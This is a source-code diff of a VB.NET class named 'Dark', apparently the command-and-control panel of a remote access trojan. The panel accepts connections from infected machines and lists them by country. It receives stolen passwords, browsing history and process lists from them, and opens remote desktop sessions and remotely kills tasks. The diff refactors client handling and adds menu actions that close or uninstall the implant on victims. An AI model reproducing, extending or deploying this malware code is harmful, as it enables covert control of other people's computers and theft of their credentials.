@@ -20,58 +20,7 @@ Public Class Dark
     Public Mass_Task As New Mass_form
     Public Mass_Task_T As Thread
 
-    Public TestBytes As Byte() = Encoding.Default.GetBytes("")
-
-    Public Sub CheckClient(ByVal k As Clients)
-
-        While True
-
-            Thread.Sleep(2000)
-
-            Try
-                k.C.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
-
-            Catch ex As Exception
-
-                For Each Cli As Clients In L
-
-                    If Cli.C.Client.RemoteEndPoint.ToString = k.C.Client.RemoteEndPoint.ToString Then
-
-                        Try
-
-                            For Each h As ListViewItem In AeroListView1.Items
-
-                                If h.Text = Cli.C.Client.RemoteEndPoint.ToString Then
-
-                                    AeroListView1.Items.Remove(h)
-
-                                End If
-
-                            Next
-
-                        Catch ex
-
-                        End Try
-
-                        Try
-                            L.Remove(k)
-
-                            L.Remove(Cli)
-                        Catch ex
-
-                        End Try
-
-                        Exit Sub
-
-                    End If
-
-                Next
-
-            End Try
-
-        End While
-
-    End Sub
+    Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
 
     Public Sub Automation_Tasks(ByVal C As Clients)
 
@@ -167,15 +116,17 @@ Public Class Dark
 
             While True
 
-                Dim Y As New Clients
+                Dim Client As New Clients(AeroListView1)
 
-                Y.C = T.AcceptTcpClient
+                Client.C = T.AcceptTcpClient
 
-                Y.ID = Y.C.Client.RemoteEndPoint.ToString
+                Client.ID = Client.C.Client.RemoteEndPoint.ToString
 
-                Y.Local_Port = port
+                Client.Local_Port = port
 
-                L.Add(Y)
+                Client.Connected = True
+
+                L.Add(Client)
 
                 Dim B As BinaryFormatter = New BinaryFormatter()
 
@@ -183,102 +134,22 @@ Public Class Dark
 
                 p.Type_Packet = PacketType.ID
 
-                Task.Run(Sub() CheckClient(Y))
+                ' Task.Run(Sub() CheckClient(Client))
+                Task.Run(Sub() Servers.PingClient(Client, Me.AeroListView1))
 
-                Dim Run_T As New Thread(Sub() R(Y, Y.C.GetStream, port))
+                'Dim Check_T As New Thread(Sub() CheckClient(Client, Me.AeroListView1))
+
+                'Check_T.Start()
+
+                '   Dim Run_T As New Thread(Sub() R(Y, Y.C.GetStream, port))
+                Dim Run_T As New Thread(Sub() Client.Read(Client.C.GetStream, port, ImageList1))
 
                 Run_T.Start()
 
-                Y.Sender(p)
-
-                Task.Run(Sub() Automation_Tasks(Y))
-
-            End While
-
-        Catch ex As Exception
-
-        End Try
-
-    End Sub
-
-    Public Async Sub R(ByVal C As Clients, ByVal L As NetworkStream, ByVal Port As String)
-
-        Try
-
-            While True
-
-                Dim sf As BinaryFormatter = New BinaryFormatter()
-
-                Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)
-
-                Try
+                Client.Sender(p)
 
 
-                    Select Case packet.Type_Packet
-
-                        Case PacketType.ID
-                            Await Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
-                          '  Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
-                     '   GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, packet.Misc, Port)
-                        Case PacketType.PW
-
-                            Dim T As New Thread(Sub() C.SetPW(packet.Misc))
-                            T.Start()
-
-                        Case PacketType.HIST
-
-                            Dim T As New Thread(Sub() C.SetHist(packet.Misc))
-
-                            T.Start()
-
-                        Case PacketType.W_PW
-
-                            Dim T As New Thread(Sub() C.SetW_PW(packet.Misc))
-
-                            T.Start()
-
-                        Case PacketType.TASKS
-
-                            Dim Subject As Packet_Subject = CType(packet.Misc(0), Packet_Subject)
-
-                            Select Case Subject
-
-                                Case Packet_Subject.RETRIEVE_TASKS
-
-                                    Dim T As New Thread(Sub() C.Set_Tasks(packet.Misc(1)))
-
-                                    T.Start()
-
-                                Case Packet_Subject.KILL_TASK
-
-                                    Dim T As New Thread(Sub() C.Set_Delete_Proc(packet.Misc))
-
-                                    T.Start()
-
-                            End Select
-
-                        Case PacketType.RD
-
-                            ThreadPool.QueueUserWorkItem(Sub() C.SetRD(packet.Misc))
-
-
-                        Case PacketType.ERROR_LOAD_NATIVE_DLL
-
-                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))
-
-                            T.Start()
-
-                        Case PacketType.SUCCESS_LOAD_NATIVE_DLL
-
-                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))
-
-                            T.Start()
-
-                    End Select
-
-                Catch ex As Exception
-
-                End Try
+                'Task.Run(Sub() Automation_Tasks(Client))
 
             End While
 
@@ -287,6 +158,7 @@ Public Class Dark
         End Try
 
     End Sub
+
 
 
     Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click
@@ -486,15 +358,46 @@ Public Class Dark
 
                 Dim p As PacketMaker = New PacketMaker()
 
-                p.Type_Packet = PacketType.MSG
+                p.Type_Packet = PacketType.CLOSE
 
                 '    Task.Run(Sub() Helpers.Sender(C, p))
                 Task.Run(Sub() C.Sender(p))
 
+                AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))
+
+                C.Dispose()
+
+                Exit For
+
             End If
 
         Next
+        GC.Collect()
+        GC.WaitForPendingFinalizers()
+    End Sub
+    Private Sub CloseUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseUninstallToolStripMenuItem.Click
+        For Each C As Clients In L
 
+            If C.ID = AeroListView1.SelectedItems(0).Text Then
+
+                Dim p As PacketMaker = New PacketMaker()
+
+                p.Type_Packet = PacketType.U_CLOSE
+
+                '    Task.Run(Sub() Helpers.Sender(C, p))
+                Task.Run(Sub() C.Sender(p))
+
+                AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))
+
+                C.Dispose()
+
+                Exit For
+
+            End If
+
+        Next
+        GC.Collect()
+        GC.WaitForPendingFinalizers()
     End Sub
 
     Private Sub RDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RDToolStripMenuItem.Click
@@ -516,6 +419,7 @@ Public Class Dark
                             Dim O As Thread = New Thread(Sub()
                                                              Application.Run(H.Viewer)
                                                          End Sub)
+
                             O.Start()
 
                         Else
@@ -924,5 +828,6 @@ Public Class Dark
         End If
 
     End Sub
+
 
 End Class
